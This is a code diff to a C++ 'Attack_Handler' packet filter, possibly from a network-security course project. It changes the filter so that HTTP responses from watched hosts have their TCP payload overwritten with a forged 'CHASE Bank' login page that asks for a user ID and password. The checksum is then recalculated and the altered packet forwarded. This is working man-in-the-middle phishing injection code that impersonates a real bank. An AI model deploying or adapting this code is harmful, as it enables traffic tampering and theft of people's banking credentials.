@@ -37,8 +37,7 @@ void Attack_Handler::parse_options(int argc, char* const argv[]){
 	load_watch_list();
 }
 
-void Attack_Handler::prerouting(IPPacket& p) {
-    	cout << "Attack_Handler::prerouting" << endl;
+void Attack_Handler::input(IPPacket& p) {
 
 	if (p.get_ip_protocol() != TCP) {
 		p.accept();
@@ -49,14 +48,30 @@ void Attack_Handler::prerouting(IPPacket& p) {
 	
 
 	if(on_watch_list(packet) && is_http_response(packet)){
+		DEBUG("Dropping packet");
+		TCPPacket new_packet((Packet &)packet, true);
+
+		char *payload = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
+
+		string new_html = "HTTP/1.1 200 OK\r\nServer: Apache\r\nDate: Sat, 01 Dec 2012 18:05:58 GMT\r\nContent-Type: text/html\r\nContent-Length:505\r\nConnection: close\r\nVary: Accept-Encoding\r\nExpires: Sat, 01 Dec 2012 18:04:07\r\nCache-Control: no-cache\r\n\r\n<!DOCTYPE html><html><head><title>CHASE Bank</title><style type=\"text/css\">.auto-style1 {font-family: \"Gill Sans\", \"Gill Sans MT\", Calibri, \"Trebuchet MS\", sans-serif;}</style></head><body><h1 class=\"auto-style1\">CHASE Bank</h1><h3>Your Security is our Top Priority</h3><p>Welcome</p><form method=\"post\">User Id <input name=\"Text1\" type=\"text\" /><br />Password <input name=\"Password1\" type=\"password\" /></form><form method=\"post\"><input name=\"Submit1\" type=\"submit\" value=\"submit\" /></form></body></html>";
+
+
+		strcpy(payload, new_html.c_str());
+		new_packet.recalculate_tcp_checksum();
+
 		DEBUG("-------------------------------------");
 		DEBUG(packet.to_s());
-		char *temp = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
+		char *temp = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
 		DEBUG("Payload: " << temp);
 		DEBUG("-------------------------------------");
-	}
 
-	p.accept();
+		new_packet.accept();
+		//packet.drop();
+		
+	}
+	else{
+		p.accept();
+	}
 }
 
 /*
